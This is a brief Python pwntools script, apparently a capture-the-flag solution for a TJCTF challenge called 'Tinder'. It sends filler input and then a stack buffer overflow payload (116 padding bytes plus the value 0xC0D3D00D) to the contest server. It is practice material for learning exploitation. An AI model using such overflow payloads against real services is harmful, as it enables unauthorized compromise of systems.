# RazviOverflow
# Python3
import sys
from pwn import *

#payload = b"\x10" + b"A"*20+p32(0xC0D3D00D)+b"\x10"
payload = b"A" * 116 + p32(0xC0D3D00D)
filling = b"Razvi"

print(payload)
'''
with open("input_file", "wb") as file:
	file.write(payload+b"\n")
	file.write(filling+b"\n")
	file.write(filling+b"\n")
	file.write(filling+b"\n")

sys.exit()
'''
#binary = process("Tinder")
binary = remote("p1.tjctf.org", 8002)

print(binary.recv())
binary.sendline(filling)
print(binary.recv())
binary.sendline(filling)
print(binary.recv())
binary.sendline(filling)
print(binary.recv())
binary.sendline(payload)
print(binary.recvall())